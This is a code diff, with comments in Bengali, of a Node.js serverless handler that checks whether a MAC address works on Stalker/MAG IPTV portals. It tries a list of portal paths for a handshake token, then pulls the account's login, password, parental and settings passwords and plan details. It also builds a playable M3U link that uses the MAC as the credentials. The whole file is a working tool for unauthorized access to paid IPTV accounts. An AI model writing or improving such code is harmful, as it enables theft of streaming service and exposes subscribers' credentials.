@@ -1,7 +1,7 @@
 const axios = require('axios');
 
 module.exports = async (req, res) => {
-    // CORS Setup
+    // CORS & Method Check
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
@@ -12,16 +12,28 @@ module.exports = async (req, res) => {
     const { host, mac } = req.body;
     if (!host || !mac) return res.status(400).json({ message: 'Missing Data' });
 
-    // ১. হোস্ট URL ফরম্যাটিং
-    // শেষের স্ল্যাশ (/) ফেলে দিয়ে ক্লিন রাখা হচ্ছে, যাতে আমরা পাথ জোড়া দিতে পারি
+    // ১. পাইথন স্ক্রিপ্টের মতো কাস্টম পার্সার (String Splitter)
+    // এটি JSON ফেইল করলেও টেক্সট থেকে ডাটা খুঁজে বের করবে
+    const extract = (text, key) => {
+        try {
+            if (typeof text !== 'string') text = JSON.stringify(text);
+            const parts = text.split(`"${key}":"`);
+            if (parts.length > 1) {
+                let val = parts[1].split('"')[0];
+                return val.replace(/\\/g, ''); // ক্লিন করা
+            }
+        } catch (e) {}
+        return null;
+    };
+
     let baseUrl = host.endsWith('/') ? host.slice(0, -1) : host;
     
-    // পাইথন স্ক্রিপ্ট থেকে নেওয়া সব জনপ্রিয় পোর্টালে পাথ
+    // পাইথন স্ক্রিপ্ট থেকে নেওয়া সব পাথ
     const portalPaths = [
-        '/portal.php',                    // Standard
-        '/server/load.php',               // Generic Stalker
-        '/stalker_portal/server/load.php', // Old Stalker
-        '/c/portal.php',                  // Xtream Codes / Stalker
+        '/portal.php',
+        '/server/load.php',
+        '/stalker_portal/server/load.php',
+        '/c/portal.php',
         '/c/server/load.php',
         '/portalstb/portal.php',
         '/magportal/portal.php',
@@ -38,99 +50,90 @@ module.exports = async (req, res) => {
 
     let workingPath = '';
     let token = '';
+    let rawData = '';
 
     try {
-        // ২. লুপ চালিয়ে সঠিক পাথ খুঁজে বের করা (Handshake Loop)
+        // ২. Handshake Loop (সঠিক পাথ খোঁজা)
         for (const path of portalPaths) {
             try {
-                // হ্যান্ডশেক রিকোয়েস্ট
                 const targetUrl = `${baseUrl}${path}?type=stb&action=handshake&token=&prehash=false&JsHttpRequest=1-xml`;
+                const resHand = await axios.get(targetUrl, { headers, timeout: 3000 });
                 
-                // টাইমআউট কম রাখা হয়েছে (২ সেকেন্ড) যাতে দ্রুত চেক হয়
-                const resHand = await axios.get(targetUrl, { headers, timeout: 2500 });
-
-                // যদি টোকেন পাওয়া যায়, তার মানে এটাই সঠিক পাথ
-                if (resHand.data?.js?.token) {
+                // পাইথন স্টাইলে টোকেন খোঁজা
+                let tempToken = extract(resHand.data, "token") || resHand.data?.js?.token;
+                
+                if (tempToken) {
                     workingPath = path;
-                    token = resHand.data.js.token;
-                    break; // লুপ ব্রেক করে পরের ধাপে যাবে
+                    token = tempToken;
+                    break;
                 }
-            } catch (e) {
-                // এই পাথ কাজ না করলে পরেরটা চেক করবে
-                continue;
-            }
+            } catch (e) { continue; }
         }
 
         if (!token) {
-            return res.json({ success: false, message: 'MAC Dead or Unknown Portal Type ❌' });
+            return res.json({ success: false, message: 'MAC Dead / Handshake Failed ❌' });
         }
 
-        // ৩. সঠিক পাথ ব্যবহার করে বাকি তথ্য বের করা
         headers['Authorization'] = `Bearer ${token}`;
+
+        // ৩. Get Profile (Text Mode)
+        // আমরা সরাসরি টেক্সট রেসপন্স নিয়ে কাজ করব যাতে কোনো ডাটা মিস না হয়
+        const profUrl = `${baseUrl}${workingPath}?type=stb&action=get_profile&JsHttpRequest=1-xml`;
+        const profRes = await axios.get(profUrl, { headers, timeout: 5000 });
+        rawData = JSON.stringify(profRes.data); // পুরো ডাটা স্ট্রিং এ কনভার্ট
+
+        // ৪. পাইথন লজিক দিয়ে ডাটা বের করা
+        // পাইথন কোডে: login, password, parent_password, tariff_plan_id ইত্যাদি বের করা হতো
+        const dataMap = {
+            expiry: extract(rawData, "phone") || extract(rawData, "end_date") || extract(rawData, "expire_billing_date") || 'Unlimited',
+            created: extract(rawData, "created") || 'Unknown',
+            username: extract(rawData, "login") || extract(rawData, "fname") || extract(rawData, "name") || 'N/A',
+            password: extract(rawData, "password") || extract(rawData, "pass") || 'N/A',
+            adult_pass: extract(rawData, "parent_password") || '0000',
+            settings_pass: extract(rawData, "settings_password") || 'N/A',
+            tariff_id: extract(rawData, "tariff_plan_id") || 'N/A',
+            tariff_plan: extract(rawData, "tariff_plan") || extract(rawData, "package_name") || 'N/A',
+            max_online: extract(rawData, "max_online") || '1', // ডিফল্ট ১
+            stb_type: extract(rawData, "stb_type") || 'MAG250',
+            country: extract(rawData, "country") || extract(rawData, "locale") || 'N/A',
+            comment: extract(rawData, "comment") || 'No Comment'
+        };
+
+        // ৫. M3U লিংক জেনারেট
+        // পাইথন স্ক্রিপ্টে m3u লিংকে ইউজারনেম/পাসওয়ার্ড হিসেবে ম্যাক ব্যবহার করা হয়েছে যদি লগিন না থাকে
+        let m3uUser = dataMap.username !== 'N/A' ? dataMap.username : mac;
+        let m3uPass = dataMap.password !== 'N/A' ? dataMap.password : mac;
         
-        let profile = {};
-        let mainInfo = {};
+        // কিছু পোর্টালে লগিন দিয়েই স্ট্রিম চলে, কিছু পোর্টালে ম্যাক লাগে
+        // সেফটির জন্য আমরা ম্যাক-ভিত্তিক লিংক দিচ্ছি যা পাইথন স্ক্রিপ্টে ডিফল্ট ছিল
+        const m3uLink = `${baseUrl}/get.php?username=${mac}&password=${mac}&type=m3u_plus&output=ts`;
 
-        // Profile Request
-        try {
-            const profUrl = `${baseUrl}${workingPath}?type=stb&action=get_profile&JsHttpRequest=1-xml`;
-            const profRes = await axios.get(profUrl, { headers, timeout: 4000 });
-            profile = profRes.data?.js || {};
-        } catch (e) {}
-
-        // Main Info Request (Max Online etc)
-        try {
-            const mainUrl = `${baseUrl}${workingPath}?type=account_info&action=get_main_info&JsHttpRequest=1-xml`;
-            const mainRes = await axios.get(mainUrl, { headers, timeout: 4000 });
-            mainInfo = mainRes.data?.js || {};
-        } catch (e) {}
-
-        // Categories Fetching
+        // ৬. ক্যাটাগরি স্ক্যান (অপশনাল)
         let live = [], vod = [];
-        // লাইভ চ্যানেল ক্যাটাগরি
         try {
-            const liveRes = await axios.get(`${baseUrl}${workingPath}?type=itv&action=get_genres&JsHttpRequest=1-xml`, { headers, timeout: 4000 });
+            const liveRes = await axios.get(`${baseUrl}${workingPath}?type=itv&action=get_genres&JsHttpRequest=1-xml`, { headers, timeout: 3000 });
             if (liveRes.data?.js) live = liveRes.data.js.map(x => x.title).slice(0, 10);
         } catch (e) {}
-        
-        // মুভি ক্যাটাগরি
+
         try {
-            const vodRes = await axios.get(`${baseUrl}${workingPath}?type=vod&action=get_categories&JsHttpRequest=1-xml`, { headers, timeout: 4000 });
+            const vodRes = await axios.get(`${baseUrl}${workingPath}?type=vod&action=get_categories&JsHttpRequest=1-xml`, { headers, timeout: 3000 });
             if (vodRes.data?.js) vod = vodRes.data.js.map(x => x.title).slice(0, 10);
         } catch (e) {}
 
-        // ৪. ফাইনাল রেসপন্স সাজানো
         return res.json({
             success: true,
             message: 'Active Account ✅',
-            connected_path: workingPath, // দেখাবে কোন পাথে কানেক্ট হয়েছে
+            connected_path: workingPath,
             data: {
                 mac: mac,
-                expiry: profile.phone || profile.end_date || 'Unlimited',
-                created: profile.created || 'Unknown',
-                
-                // Advanced Info
-                username: profile.fname || profile.login || profile.name || 'Hidden',
-                password: profile.password || 'Hidden',
-                tariff_id: profile.tariff_plan_id || 'N/A',
-                stb_type: profile.stb_type || 'MAG',
-                
-                // Main Info
-                max_online: mainInfo.max_online || '1',
-                plan_name: mainInfo.package_name || mainInfo.phone || 'N/A',
-
-                // Lists
+                ...dataMap,
+                m3u: m3uLink,
                 liveCategories: live,
-                vodCategories: vod,
-                
-                // Debugging
-                raw_profile: profile,
-                
-                m3u: `${baseUrl}/get.php?username=${mac}&password=${mac}&type=m3u_plus&output=ts`
+                vodCategories: vod
             }
         });
 
     } catch (error) {
-        return res.status(500).json({ success: false, message: 'Server Connection Error', error: error.message });
+        return res.status(500).json({ success: false, message: 'Server Error', error: error.message });
     }
 };
